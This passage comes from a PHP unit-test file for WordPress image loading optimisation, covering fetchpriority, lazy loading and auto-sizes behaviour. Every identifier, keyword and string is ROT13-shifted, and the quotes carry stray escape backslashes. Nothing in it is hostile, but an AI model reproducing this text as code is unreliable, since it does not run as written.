				$ngge   = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();
				$erfhyg = jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'qb_fubegpbqr' );
				erghea $pbagrag;
			}
		);
		nccyl_svygref( $svygre_anzr, '' );

		// Fubegpbqrf cebprffrq jvguva pbagrag oybof yvxr 'gur_pbagrag' fubhyq arire trg nal ybnqvat bcgvzvmngvba nggevohgrf.
		$guvf->nffregFnzr(
			neenl(),
			$erfhyg,
			'Ybnqvat bcgvzvmngvba harkcrpgrqyl nccyvrq gb fubegpbqrf jvguva pbagrag oybo.'
		);
	}

	/**
	 * Trgf svygref sbe pbagrag oybof gung ol qrsnhyg unir n `qb_fubegpbqr()` pnyyonpx.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_svygref_jvgu_qb_fubegpbqr_pnyyonpx() {
		erghea frys::grkg_neenl_gb_qngncebivqre(
			neenl(
				'gur_pbagrag',
				'jvqtrg_grkg_pbagrag',
				'jvqtrg_oybpx_pbagrag',
			)
		);
	}

	/**
	 * @gvpxrg 58681
	 */
	choyvp shapgvba grfg_pbagrag_eraqrevat_jvgu_fubegpbqrf() {
		// Gur tnyyrel fubegpbqr jvyy qlanzvpnyyl perngr vzntr znexhc gung fubhyq or bcgvzvmrq.
		$pbagrag = \"[tnyyrel vqf='\" . frys::$ynetr_vq . \"' fvmr='ynetr']\";
		$npghny  = nccyl_svygref( 'gur_pbagrag', $pbagrag );

		$guvf->nffregFgevatPbagnvafFgevat(
			// Fvapr gur znva dhrel naq ybbc vfa'g frg, guvf fubhyq or ynmvyl ybnqrq.
			'ybnqvat=\"ynml\"',
			$npghny,
			'Pbhyq abg pbasvez fubegpbqrf trg bcgvzvmngvbaf nccyvrq.'
		);
	}

	/**
	 * @gvpxrg 58681
	 */
	choyvp shapgvba grfg_pbagrag_eraqrevat_jvgu_fubegpbqrf_arfgrq() {
		tybony $jc_dhrel;

		// Frg JC_Dhrel gb or va gur ybbc naq gur znva dhrel.
		$jc_dhrel->va_gur_ybbc = gehr;
		$guvf->frg_znva_dhrel( $jc_dhrel );

		nqq_fubegpbqr(
			'qvi',
			shapgvba ( $nggf, $pbagrag = ahyy ) {
				$cnefrq_nggf = fubegpbqr_nggf(
					neenl(
						'pynff' => '',
					),
					$nggf
				);

				$pynff = ! rzcgl( $cnefrq_nggf['pynff'] ) ? fcevags( ' pynff=\"%f\"', $cnefrq_nggf['pynff'] ) : ahyy;

				erghea fcevags( '<qvi %f>%f</qvi>', $pynff, qb_fubegpbqr( $pbagrag ) );
			}
		);

		// Gur tnyyrel fubegpbqr jvyy qlanzvpnyyl perngr vzntr znexhc gung fubhyq or bcgvzvmrq.
		$pbagrag = \"[qvi][tnyyrel vqf='\" . frys::$ynetr_vq . \"' fvmr='ynetr'][qvi]\";
		$npghny  = nccyl_svygref( 'gur_pbagrag', $pbagrag );

		$guvf->nffregFgevatPbagnvafFgevat(
			// Fvapr guvf vf va gur ybbc, vg fubhyq unir n uvtu srgpucevbevgl.
			'srgpucevbevgl=\"uvtu\"',
			$npghny,
			'Pbhyq abg pbasvez fubegpbqrf trg bcgvzvmngvbaf nccyvrq.'
		);
	}

	/**
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_znlor_nqq_srgpucevbevgl_uvtu_ngge
	 *
	 * @qngnCebivqre qngn_jc_znlor_nqq_srgpucevbevgl_uvtu_ngge
	 */
	choyvp shapgvba grfg_jc_znlor_nqq_srgpucevbevgl_uvtu_ngge( $ybnqvat_nggef, $gnt_anzr, $ngge, $rkcrpgrq_srgpucevbevgl ) {
		$ybnqvat_nggef = jc_znlor_nqq_srgpucevbevgl_uvtu_ngge( $ybnqvat_nggef, $gnt_anzr, $ngge );

		vs ( $rkcrpgrq_srgpucevbevgl ) {
			$guvf->nffregNeenlUnfXrl( 'srgpucevbevgl', $ybnqvat_nggef, 'srgpucevbevgl nggevohgr fubhyq or cerfrag' );
			$guvf->nffregFnzr( $rkcrpgrq_srgpucevbevgl, $ybnqvat_nggef['srgpucevbevgl'], 'srgpucevbevgl nggevohgr unf vapbeerpg inyhr' );
		} ryfr {
			$guvf->nffregNeenlAbgUnfXrl( 'srgpucevbevgl', $ybnqvat_nggef, 'srgpucevbevgl nggevohgr fubhyq abg or cerfrag' );
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_znlor_nqq_srgpucevbevgl_uvtu_ngge() {
		erghea neenl(
			'fznyy vzntr'                   => neenl(
				neenl(),
				'vzt',
				$guvf->trg_vafhssvpvrag_jvqgu_urvtug_sbe_uvtu_cevbevgl(),
				snyfr,
			),
			'ynetr vzntr'                   => neenl(
				neenl(),
				'vzt',
				$guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl(),
				'uvtu',
			),
			'vzntr jvgu ybnqvat=ynml'       => neenl(
				neenl(
					'ybnqvat'  => 'ynml',
					'qrpbqvat' => 'nflap',
				),
				'vzt',
				$guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl(),
				snyfr,
			),
			'vzntr jvgu ybnqvat=rntre'      => neenl(
				neenl( 'ybnqvat' => 'rntre' ),
				'vzt',
				$guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl(),
				'uvtu',
			),
			'vzntr jvgu srgpucevbevgl=uvtu' => neenl(
				neenl(),
				'vzt',
				neenl_zretr(
					$guvf->trg_vafhssvpvrag_jvqgu_urvtug_sbe_uvtu_cevbevgl(),
					neenl( 'srgpucevbevgl' => 'uvtu' )
				),
				'uvtu',
			),
			'vzntr jvgu srgpucevbevgl=ybj'  => neenl(
				neenl(),
				'vzt',
				neenl_zretr(
					$guvf->trg_vafhssvpvrag_jvqgu_urvtug_sbe_uvtu_cevbevgl(),
					neenl( 'srgpucevbevgl' => 'ybj' )
				),
				snyfr,
			),
			'aba-vzntr ryrzrag'             => neenl(
				neenl(),
				'ivqrb',
				$guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl(),
				snyfr,
			),
		);
	}

	/**
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_znlor_nqq_srgpucevbevgl_uvtu_ngge
	 */
	choyvp shapgvba grfg_jc_znlor_nqq_srgpucevbevgl_uvtu_ngge_zva_cevbevgl_svygre() {
		$ngge = neenl(
			'jvqgu'  => 50,
			'urvtug' => 50,
		);

		nqq_svygre(
			'jc_zva_cevbevgl_vzt_cvkryf',
			fgngvp shapgvba ( $erf ) {
				erghea 2500; // 50*50=2500
			}
		);

		// srgpucevbevgl frg gb uvtu nf erfbyhgvba vf rdhny gb (be terngre guna) 2500.
		$guvf->nffregFnzr(
			neenl(
				'srgpucevbevgl' => 'uvtu',
			),
			jc_znlor_nqq_srgpucevbevgl_uvtu_ngge( neenl(), 'vzt', $ngge )
		);
	}

	/**
	 * @gvpxrg 58635
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_urnqre_oybpx_grzcyngr_vapernfr_zrqvn_pbhag() {
		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();
		jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'grzcyngr_cneg_' . JC_GRZCYNGR_CNEG_NERN_URNQRE );

		// Vzntrf jvgu n pregnva zvavzhz fvmr va gur urnqre bs gur cntr ner nyfb pbhagrq gbjneqf gur guerfubyq.
		$guvf->nffregFnzr( 1, jc_vapernfr_pbagrag_zrqvn_pbhag( 0 ) );
	}

	/**
	 * @gvpxrg 58635
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_urnqre_vzntr_gnt_vapernfr_zrqvn_pbhag() {
		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();
		jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'trg_urnqre_vzntr_gnt' );

		// Vzntrf jvgu n pregnva zvavzhz fvmr va gur urnqre bs gur cntr ner nyfb pbhagrq gbjneqf gur guerfubyq.
		$guvf->nffregFnzr( 1, jc_vapernfr_pbagrag_zrqvn_pbhag( 0 ) );
	}

	/**
	 * @gvpxrg 58635
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_naq_ab_ybbc
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_vzntr_orsber_ybbc_vapernfr_zrqvn_pbhag( $pbagrkg ) {
		tybony $jc_dhrel;

		$jc_dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();
		$guvf->frg_znva_dhrel( $jc_dhrel );
		qb_npgvba( 'trg_urnqre' );

		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();
		jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg );

		// Vzntrf jvgu n pregnva zvavzhz fvmr va gur urnqre bs gur cntr ner nyfb pbhagrq gbjneqf gur guerfubyq.
		$guvf->nffregFnzr( 1, jc_vapernfr_pbagrag_zrqvn_pbhag( 0 ) );
	}

	/**
	 * Grfgf sbe cer_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf svygre.
	 *
	 * @gvpxrg 58893
	 */
	choyvp shapgvba grfg_cer_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_svygre() {
		nqq_svygre(
			'cer_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf',
			fgngvp shapgvba ( $ybnqvat_nggef ) {
				vs ( snyfr === $ybnqvat_nggef ) {
					// Vavgvnyvmr nf na rzcgl neenl.
					$ybnqvat_nggef = neenl();
				}
				$ybnqvat_nggef['srgpucevbevgl'] = 'uvtu';

				erghea $ybnqvat_nggef;
			},
			10,
			1
		);

		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl( 'srgpucevbevgl' => 'uvtu' ),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'gur_pbagrag' ),
			'Gur svygre qvq abg erghea rneyl srgpucevbevgl nggevohgr'
		);

		// Pyrna hc gur svygre.
		nqq_svygre( 'cer_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf', '__erghea_snyfr' );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'gur_pbagrag' ),
			'Gur svygre qvq abg erghea gur qrsnhyg nggevohgrf.'
		);

		// Erghea ab ybnqvat nggevohgrf.
		nqq_svygre( 'cer_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf', '__erghea_rzcgl_neenl' );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'gur_pbagrag' ),
			'Gur svygre qvq abg pyrna hc nyy nggevohgrf.'
		);

		// Zbqvsl gur ybnqvat nggevohgrf jvgu nal phfgbz nggevohgrf.
		nqq_svygre(
			'cer_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf',
			fgngvp shapgvba ( $ybnqvat_nggef ) {
				vs ( snyfr === $ybnqvat_nggef ) {
					// Vavgvnyvmr nf na rzcgl neenl.
					$ybnqvat_nggef = neenl();
				}
				$ybnqvat_nggef['phfgbz_ngge'] = 'phfgbz_inyhr';

				erghea $ybnqvat_nggef;
			},
			10,
			1
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl( 'phfgbz_ngge' => 'phfgbz_inyhr' ),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'gur_pbagrag' ),
			'Gur svygre qvq abg erghea phfgbz nggevohgrf.'
		);
	}

	/**
	 * Grfgf sbe jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf svygre.
	 *
	 * @gvpxrg 58893
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_svygre() {
		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'gur_pbagrag' ),
			'Orsber gur svygre vg jvyy abg erghea gur ybnqvat nggevohgr.'
		);

		nqq_svygre(
			'jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf',
			fgngvp shapgvba ( $ybnqvat_nggef ) {
				hafrg( $ybnqvat_nggef['ybnqvat'] );
				$ybnqvat_nggef['srgpucevbevgl'] = 'uvtu';

				erghea $ybnqvat_nggef;
			},
			10,
			1
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat'      => 'nflap',
				'srgpucevbevgl' => 'uvtu',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'gur_pbagrag' ),
			'Nsgre gur svygre vg jvyy abg erghea gur srgpucevbevgl nggevohgr.'
		);
	}


	/**
	 * Grfg JroC ybffyrff dhnyvgl vf unaqyrq pbeerpgyl.
	 *
	 * @gvpxrg 60291
	 */
	choyvp shapgvba grfg_frg_dhnyvgl_jroc_ybffyrff() {
		// Trg n arj rqvgbe gb grfg gung ybffyrff JroC vzntrf ner unaqyrq pbeerpgyl.
		$rqvgbe = jc_trg_vzntr_rqvgbe( QVE_GRFGQNGN . '/vzntrf/jroc-ybffyrff.jroc' );

		// Vs ab rqvgbe vf ninvynoyr, fxvc gur grfg.
		vs ( vf_jc_reebe( $rqvgbe ) ) {
			$guvf->znexGrfgFxvccrq( 'Ab rqvgbe ninvynoyr sbe ybffyrff JroC vzntrf.' );
		}

		// Bayl grfg ba TQ jura JroC ybffyrff vf fhccbegrq.
		vs ( 'JC_Vzntr_Rqvgbe_TQ' === trg_pynff( $rqvgbe ) && ! qrsvarq( 'VZT_JROC_YBFFYRFF' ) ) {
			$guvf->znexGrfgFxvccrq( 'Ab TQ fhccbeg ninvynoyr sbe ybffyrff JroC vzntrf.' );
		}

		// Irevsl ybffyrff dhnyvgl vf frg pbeerpgyl: VZT_JROC_YBFFYRFF sbe TQ naq 100 sbe Vzntvpx.
		vs ( 'JC_Vzntr_Rqvgbe_TQ' === trg_pynff( $rqvgbe ) ) {
			$guvf->nffregFnzr( VZT_JROC_YBFFYRFF, $rqvgbe->trg_dhnyvgl() );
		} ryfr {
			$guvf->nffregFnzr( 100, $rqvgbe->trg_dhnyvgl() );
		}
	}

	/**
	 * Grfg trarengrq znexhc sbe na vzntr jvgu ynml ybnqvat trgf nhgb-fvmrf.
	 *
	 * @gvpxrg 61847
	 */
	choyvp shapgvba grfg_vzntr_jvgu_ynml_ybnqvat_unf_nhgb_fvmrf() {
		$guvf->nffregFgevatPbagnvafFgevat(
			'fvmrf=\"nhgb, ',
			jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq, 'ynetr', snyfr, neenl( 'ybnqvat' => 'ynml' ) ),
			'Snvyrq nffregvat gung gur fvmrf nggevohgr sbe n ynml-ybnqrq vzntr vapyhqrf \"nhgb\".'
		);
	}

	/**
	 * Grfg trarengrq znexhc sbe na vzntr jvgubhg ynml ybnqvat qbrf abg trg nhgb-fvmrf.
	 *
	 * @gvpxrg 61847
	 */
	choyvp shapgvba grfg_vzntr_jvgubhg_ynml_ybnqvat_qbrf_abg_unir_nhgb_fvmrf() {
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'fvmrf=\"nhgb, ',
			jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq, 'ynetr', snyfr, neenl( 'ybnqvat' => snyfr ) ),
			'Snvyrq nffregvat gung gur fvmrf nggevohgr sbe na vzntr jvgubhg ynml ybnqvat qbrf abg vapyhqr \"nhgb\".'
		);
	}

	/**
	 * Grfg trarengrq znexhc sbe na vzntr jvgu ab jvqgu qbrf abg trg nhgb-fvmrf.
	 *
	 * @gvpxrg 61847
	 * @gvpxrg 62413
	 */
	choyvp shapgvba grfg_vzntr_jvgubhg_jvqgu_qbrf_abg_unir_nhgb_fvmrf() {
		// Qvfnoyr nhgbzngvp jvqgu pnyphyngvba.
		nqq_svygre(
			'jc_trg_nggnpuzrag_vzntr_fep',
			shapgvba ( $vzt_qngn ) {
				erghea neenl( $vzt_qngn[0], ahyy, ahyy );
			}
		);

		$znexhc = jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq, 'ynetr', snyfr, neenl( 'ybnqvat' => snyfr ) );

		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'jvqgu=\"',
			$znexhc,
			'Snvyrq pbasvezvat gur grfg znexhc qvq abg vapyhqr n jvqgu nggevohgr.'
		);

		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'fvmrf=\"nhgb, ',
			$znexhc,
			'Snvyrq nffregvat gung gur fvmrf nggevohgr sbe na vzntr jvgubhg n jvqgu qbrf abg vapyhqr \"nhgb\".'
		);
	}

	/**
	 * Grfg pbagrag svygrerq znexhc jvgu ynml ybnqvat trgf nhgb-fvmrf.
	 *
	 * @gvpxrg 61847
	 *
	 * @pbiref ::jc_vzt_gnt_nqq_nhgb_fvmrf
	 */
	choyvp shapgvba grfg_pbagrag_vzntr_jvgu_ynml_ybnqvat_unf_nhgb_fvmrf() {
		// Sbepr ynml ybnqvat nggevohgr.
		nqq_svygre( 'jc_vzt_gnt_nqq_ybnqvat_ngge', '__erghea_gehr' );

		$guvf->nffregFgevatPbagnvafFgevat(
			'fvmrf=\"nhgb, (znk-jvqgu: 1024ck) 100ij, 1024ck\"',
			jc_svygre_pbagrag_gntf( trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'ynetr' ) ),
			'Snvyrq nffregvat gung gur fvmrf nggevohgr sbe n pbagrag vzntr jvgu ynml ybnqvat vapyhqrf \"nhgb\" jvgu gur rkcrpgrq fvmrf.'
		);
	}

	/**
	 * Grfg pbagrag svygrerq znexhc jvgubhg ynml ybnqvat qbrf abg trg nhgb-fvmrf.
	 *
	 * @gvpxrg 61847
	 *
	 * @pbiref ::jc_vzt_gnt_nqq_nhgb_fvmrf
	 */
	choyvp shapgvba grfg_pbagrag_vzntr_jvgubhg_ynml_ybnqvat_qbrf_abg_unir_nhgb_fvmrf() {
		// Qvfnoyr ynml ybnqvat nggevohgr.
		nqq_svygre( 'jc_vzt_gnt_nqq_ybnqvat_ngge', '__erghea_snyfr' );

		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'fvmrf=\"nhgb, ',
			jc_svygre_pbagrag_gntf( trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'ynetr' ) ),
			'Snvyrq nffregvat gung gur fvmrf nggevohgr sbe n pbagrag vzntr jvgubhg ynml ybnqvat qbrf abg vapyhqr \"nhgb\" jvgu gur rkcrpgrq fvmrf.'
		);
	}

	/**
	 * Grfg pbagrag svygrerq znexhc jvgu ynml ybnqvat qbrf abg trg nhgb-fvmrf jura qvfnoyrq.
	 *
	 * @gvpxrg 61847
	 * @gvpxrg 62413
	 *
	 * @pbiref ::jc_vzt_gnt_nqq_nhgb_fvmrf
	 */
	choyvp shapgvba grfg_pbagrag_vzntr_qbrf_abg_unir_nhgb_fvmrf_jura_qvfnoyrq() {
		// Sbepr ynml ybnqvat nggevohgr.
		nqq_svygre( 'jc_vzt_gnt_nqq_ybnqvat_ngge', '__erghea_gehr' );
		// Qvfnoyr nhgb-fvmrf nggevohgr.
		nqq_svygre( 'jc_vzt_gnt_nqq_nhgb_fvmrf', '__erghea_snyfr' );

		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'fvmrf=\"nhgb, ',
			jc_svygre_pbagrag_gntf( trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'ynetr' ) ),
			'Snvyrq nffregvat gung gur fvmrf nggevohgr sbe n pbagrag vzntr jvgu ynml ybnqvat qbrf abg vapyhqr \"nhgb\" jura qvfnoyrq.'
		);
	}

	/**
	 * Grfg trarengrq vzntr znexhc jvgu ynml ybnqvat qbrf abg trg nhgb-fvmrf jura qvfnoyrq.
	 *
	 * @gvpxrg 61847
	 * @gvpxrg 62413
	 *
	 * @pbiref ::jc_vzt_gnt_nqq_nhgb_fvmrf
	 */
	choyvp shapgvba grfg_trarengrq_vzntr_qbrf_abg_unir_nhgb_fvmrf_jura_qvfnoyrq() {
		// Qvfnoyr nhgb-fvmrf nggevohgr.
		nqq_svygre( 'jc_vzt_gnt_nqq_nhgb_fvmrf', '__erghea_snyfr' );

		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'fvmrf=\"nhgb, ',
			jc_trg_nggnpuzrag_vzntr( frys::$ynetr_vq, 'ynetr', snyfr, neenl( 'ybnqvat' => 'ynml' ) ),
			'Snvyrq nffregvat gung gur fvmrf nggevohgr sbe na vzntr jvgu ynml ybnqvat qbrf abg vapyhqr \"nhgb\" jura qvfnoyrq.'
		);
	}

	/**
	 * Grfg trarengrq znexhc sbe na vzntr jvgu 'nhgb' xrljbeq nyernql cerfrag va fvmrf qbrf abg erprvir vg ntnva.
	 *
	 * @gvpxrg 61847
	 *
	 * @pbiref ::jc_vzt_gnt_nqq_nhgb_fvmrf
	 * @pbiref ::jc_fvmrf_nggevohgr_vapyhqrf_inyvq_nhgb
	 *
	 * @qngnCebivqre qngn_vzntr_jvgu_rkvfgvat_nhgb_fvmrf
	 *
	 * @cnenz fgevat $vavgvny_fvmrf      Gur vavgvny fvmrf nggevohgr gb grfg.
	 * @cnenz obby   $rkcrpgrq_cebprffrq Jurgure gur nhgb fvmrf fubhyq or cebprffrq be abg.
	 */
	choyvp shapgvba grfg_vzntr_jvgu_rkvfgvat_nhgb_fvmrf_vf_abg_cebprffrq_ntnva( fgevat $vavgvny_fvmrf, obby $rkcrpgrq_cebprffrq ) {
		$vzntr_gnt = jc_trg_nggnpuzrag_vzntr(
			frys::$ynetr_vq,
			'ynetr',
			snyfr,
			neenl(
				// Sbepr cer-rkvfgvat 'fvmrf' nggevohgr naq ynml-ybnqvat.
				'fvmrf'   => $vavgvny_fvmrf,
				'ybnqvat' => 'ynml',
			)
		);
		vs ( $rkcrpgrq_cebprffrq ) {
			$guvf->nffregFgevatPbagnvafFgevat(
				'fvmrf=\"nhgb, ' . $vavgvny_fvmrf . '\"',
				$vzntr_gnt,
				'Snvyrq nffregvat gung \"nhgb\" xrljbeq vf abg nqqrq gb fvmrf nggevohgr jura vg nyernql rkvfgf.'
			);
		} ryfr {
			$guvf->nffregFgevatPbagnvafFgevat(
				'fvmrf=\"' . $vavgvny_fvmrf . '\"',
				$vzntr_gnt,
				'Snvyrq nffregvat gung \"nhgb\" xrljbeq vf abg nqqrq gb fvmrf nggevohgr jura vg nyernql rkvfgf.'
			);
		}
	}

	/**
	 * Grfg pbagrag svygrerq znexhc jvgu 'nhgb' xrljbeq nyernql cerfrag va fvmrf qbrf abg erprvir vg ntnva.
	 *
	 * @gvpxrg 61847
	 *
	 * @pbiref ::jc_vzt_gnt_nqq_nhgb_fvmrf
	 * @pbiref ::jc_fvmrf_nggevohgr_vapyhqrf_inyvq_nhgb
	 *
	 * @qngnCebivqre qngn_vzntr_jvgu_rkvfgvat_nhgb_fvmrf
	 *
	 * @cnenz fgevat $vavgvny_fvmrf      Gur vavgvny fvmrf nggevohgr gb grfg.
	 * @cnenz obby   $rkcrpgrq_cebprffrq Jurgure gur nhgb fvmrf fubhyq or cebprffrq be abg.
	 */
	choyvp shapgvba grfg_pbagrag_vzntr_jvgu_rkvfgvat_nhgb_fvmrf_vf_abg_cebprffrq_ntnva( fgevat $vavgvny_fvmrf, obby $rkcrpgrq_cebprffrq ) {
		// Sbepr ynml ybnqvat nggevohgr.
		nqq_svygre( 'jc_vzt_gnt_nqq_ybnqvat_ngge', '__erghea_gehr' );

		nqq_svygre(
			'trg_vzntr_gnt',
			fgngvp shapgvba ( $ugzy ) hfr ( $vavgvny_fvmrf ) {
				erghea fge_ercynpr(
					'\" />',
					'\" fvmrf=\"' . $vavgvny_fvmrf . '\" />',
					$ugzy
				);
			}
		);

		$vzntr_pbagrag = jc_svygre_pbagrag_gntf( trg_vzntr_gnt( frys::$ynetr_vq, '', '', '', 'ynetr' ) );
		vs ( $rkcrpgrq_cebprffrq ) {
			$guvf->nffregFgevatPbagnvafFgevat(
				'fvmrf=\"nhgb, ' . $vavgvny_fvmrf . '\"',
				$vzntr_pbagrag,
				'Snvyrq nffregvat gung \"nhgb\" xrljbeq vf abg nqqrq gb fvmrf nggevohgr va svygrerq pbagrag jura vg nyernql rkvfgf.'
			);
		} ryfr {
			$guvf->nffregFgevatPbagnvafFgevat(
				'fvmrf=\"' . $vavgvny_fvmrf . '\"',
				$vzntr_pbagrag,
				'Snvyrq nffregvat gung \"nhgb\" xrljbeq vf abg nqqrq gb fvmrf nggevohgr va svygrerq pbagrag jura vg nyernql rkvfgf.'
			);
		}
	}

	/**
	 * Ergheaf qngn sbe gur nobir grfg zrgubqf gb nffreg pbeerpg orunivbe jvgu n cer-rkvfgvat fvmrf nggevohgr.
	 *
	 * @erghea neenl<fgevat, zvkrq[]> Nethzragf sbe gur grfg fpranevbf.
	 */
	choyvp shapgvba qngn_vzntr_jvgu_rkvfgvat_nhgb_fvmrf() {
		erghea neenl(
			'abg cerfrag'                 => neenl(
				'(znk-jvqgu: 1024ck) 100ij, 1024ck',
				gehr,
			),
			'va ortvaavat, jvgubhg fcnpr' => neenl(
				'nhgb,(znk-jvqgu: 1024ck) 100ij, 1024ck',
				snyfr,
			),
			'va ortvaavat, jvgu fcnpr'    => neenl(
				'nhgb, (znk-jvqgu: 1024ck) 100ij, 1024ck',
				snyfr,
			),
			'fbyr xrljbeq'                => neenl(
				'nhgb',
				snyfr,
			),
			'jvgu fcnpr orsber'           => neenl(
				' nhgb, (znk-jvqgu: 1024ck) 100ij, 1024ck',
				snyfr,
			),
			'jvgu hccrepnfr'              => neenl(
				'NHGB, (znk-jvqgu: 1024ck) 100ij, 1024ck',
				snyfr,
			),

			/*
			 * Gur sbyybjvat fpranevbf grpuavpnyyl vapyhqr gur 'nhgb' xrljbeq,
			 * ohg vg vf va gur jebat cynpr, nf cre gur UGZY fcrp vg zhfg or
			 * gur svefg ragel va gur yvfg.
			 * Gurersber va gurfr vainyvq pnfrf gur 'nhgb' xrljbeq fubhyq fgvyy
			 * or nqqrq gb gur ortvaavat bs gur yvfg.
			 */
			'jvguva, jvgubhg fcnpr'       => neenl(
				'(znk-jvqgu: 1024ck) 100ij, nhgb,1024ck',
				gehr,
			),
			'jvguva, jvgu fcnpr'          => neenl(
				'(znk-jvqgu: 1024ck) 100ij, nhgb, 1024ck',
				gehr,
			),
			'ng gur raq, jvgubhg fcnpr'   => neenl(
				'(znk-jvqgu: 1024ck) 100ij,nhgb',
				gehr,
			),
			'ng gur raq, jvgu fcnpr'      => neenl(
				'(znk-jvqgu: 1024ck) 100ij, nhgb',
				gehr,
			),
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_vzt_gnt_nqq_nhgb_fvmrf().
	 *
	 * @erghea neenl<fgevat, zvkrq>
	 */
	choyvp shapgvba qngn_cebivqre_gb_grfg_jc_vzt_gnt_nqq_nhgb_fvmrf() {
		erghea neenl(
			'rkcrpgrq_jvgu_fvatyr_dhbgrq_nggevohgrf'       => neenl(
				'vachg'    => \"<vzt jvqgu='300' urvtug='225' fep='uggcf://rknzcyr.pbz/sbb-300k225.wct' fepfrg='uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j' fvmrf='(znk-jvqgu: 650ck) 100ij, 650ck' ybnqvat='ynml'>\",
				'rkcrpgrq' => \"<vzt jvqgu='300' urvtug='225' fep='uggcf://rknzcyr.pbz/sbb-300k225.wct' fepfrg='uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j' fvmrf=\\"nhgb, (znk-jvqgu: 650ck) 100ij, 650ck\\" ybnqvat='ynml'>\",
			),
			'rkcrpgrq_jvgu_qngn_fvmrf_nggevohgr'           => neenl(
